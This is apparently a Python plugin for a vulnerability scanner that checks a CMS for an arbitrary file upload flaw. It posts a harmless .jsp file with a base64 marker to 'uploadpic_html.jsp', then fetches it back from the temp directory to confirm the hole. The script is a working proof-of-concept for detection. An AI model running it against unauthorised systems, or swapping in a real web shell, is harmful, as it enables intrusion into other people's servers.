#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            xmldata = '''
            <?xml version="1.0" encoding="UTF-8"?>
            <root>
            dGVzdCBieSBtZQ==
            </root>
            '''
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, ['./ucms/', './']):
                    myurl = path + 'cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
                    try:
                        async with session.post(url=myurl, data=xmldata) as res:
                            if res != None and res.status == 200:
                                myurl = path + 'cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
                                async with session.post(url=myurl, data=xmldata) as res:
                                    if res != None:
                                        text = await res.text()
                                        if 'test by me' in text:
                                            yield myurl
                    except:
                        pass